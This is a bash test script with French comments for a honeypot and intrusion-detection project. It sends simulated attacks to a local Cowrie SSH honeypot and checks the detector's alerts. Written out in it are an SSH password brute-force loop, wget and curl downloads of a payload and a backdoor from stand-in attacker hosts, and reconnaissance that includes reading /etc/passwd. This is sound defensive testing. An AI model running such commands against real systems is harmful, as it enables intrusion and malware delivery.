#!/bin/bash

# Script de test pour le projet Honeypot/NIDS
# Teste la détection d'attaques par le NIDS

set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}=== Test du système Honeypot/NIDS ===${NC}\n"

# Configuration
TARGET="127.0.0.1"
SSH_PORT="2222"
WAIT_TIME=3

# Fonction pour attendre
wait_and_log() {
    echo -e "${YELLOW}Attente de ${1}s pour la détection...${NC}"
    sleep $1
}

# Fonction pour vérifier les alertes
check_alerts() {
    echo -e "\n${GREEN}=== Vérification des alertes NIDS ===${NC}"
    docker compose exec nids sh -c 'tail -n 50 /app/logs/alerts.jsonl 2>/dev/null | jq -r ".type" 2>/dev/null | sort | uniq -c || echo "Aucune alerte trouvée"'
}

# Fonction pour afficher les logs Cowrie
show_cowrie_logs() {
    echo -e "\n${GREEN}=== Derniers événements Cowrie ===${NC}"
    docker compose cp cowrie:/cowrie/var/log/cowrie/cowrie.json - 2>/dev/null | \
        tail -n 10 | \
        jq -r 'select(.eventid == "cowrie.command.input") | .input' 2>/dev/null || \
        echo "Aucune commande trouvée"
}

# 1. Vérifier que les services sont démarrés
echo -e "${GREEN}1. Vérification des services${NC}"
docker compose ps

echo -e "\n${GREEN}2. Nettoyage des anciennes alertes${NC}"
docker compose exec nids sh -c 'rm -f /app/logs/alerts.jsonl && touch /app/logs/alerts.jsonl'

# 2. Test de connexion simple (baseline)
echo -e "\n${GREEN}3. Test de connexion SSH (baseline)${NC}"
sshpass -p 'password' ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o GlobalKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o NumberOfPasswordPrompts=1 \
    -o ConnectTimeout=5 \
    -p $SSH_PORT root@$TARGET \
    "echo 'Test connexion' && exit" 2>/dev/null || true

wait_and_log $WAIT_TIME

# 3. Test de brute force
echo -e "\n${GREEN}4. Test d'attaque par brute force${NC}"
for pass in "wrong1" "wrong2" "wrong3" "wrong4" "wrong5"; do
    echo "Tentative avec mot de passe: $pass"
    sshpass -p "$pass" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout=5 \
        -p $SSH_PORT root@$TARGET "echo test" 2>/dev/null || true
    sleep 0.5
done

wait_and_log $WAIT_TIME
check_alerts

# 4. Test de téléchargement de payload (wget)
echo -e "\n${GREEN}5. Test de détection wget (payload download)${NC}"
sshpass -p 'password' ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o GlobalKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o NumberOfPasswordPrompts=1 \
    -o ConnectTimeout=5 \
    -p $SSH_PORT root@$TARGET \
    "sh -c 'wget http://malicious.example.com/payload.sh && exit'" 2>/dev/null || true

wait_and_log $WAIT_TIME
check_alerts

# 5. Test avec curl
echo -e "\n${GREEN}6. Test de détection curl (payload download)${NC}"
sshpass -p 'password' ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout=5 \
    -p $SSH_PORT root@$TARGET \
    "sh -c 'curl -O http://evil.com/backdoor && exit'" 2>/dev/null || true

wait_and_log $WAIT_TIME
check_alerts

# 6. Test de reconnaissance
echo -e "\n${GREEN}7. Test de commandes de reconnaissance${NC}"
sshpass -p 'password' ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout=5 \
    -p $SSH_PORT root@$TARGET \
    "sh -c 'whoami && id && uname -a && cat /etc/passwd && exit'" 2>/dev/null || true

wait_and_log $WAIT_TIME
check_alerts

# 7. Test d'élévation de privilèges
echo -e "\n${GREEN}8. Test d'élévation de privilèges${NC}"
sshpass -p 'password' ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout=5 \
    -p $SSH_PORT root@$TARGET \
    "sh -c 'sudo su - && exit'" 2>/dev/null || true

wait_and_log $WAIT_TIME

# Résumé final
echo -e "\n${GREEN}=== RÉSUMÉ DES TESTS ===${NC}\n"

echo -e "${GREEN}Alertes détectées par type:${NC}"
docker compose exec nids sh -c 'cat /app/logs/alerts.jsonl 2>/dev/null | jq -r ".type" 2>/dev/null | sort | uniq -c || echo "Aucune alerte"'

echo -e "\n${GREEN}Détails des alertes PAYLOAD:${NC}"
docker compose exec nids sh -c 'cat /app/logs/alerts.jsonl 2>/dev/null | jq "select(.type | contains(\"PAYLOAD\"))" 2>/dev/null || echo "Aucune"'

echo -e "\n${GREEN}Logs Cowrie - Commandes wget/curl:${NC}"
show_cowrie_logs

echo -e "\n${GREEN}=== Tests terminés ===${NC}"
echo -e "${YELLOW}Pour voir tous les logs NIDS:${NC}"
echo "docker compose exec nids cat /app/logs/alerts.jsonl | jq"
echo -e "${YELLOW}Pour voir les logs Cowrie:${NC}"
echo "docker compose cp cowrie:/cowrie/var/log/cowrie/cowrie.json - | jq"
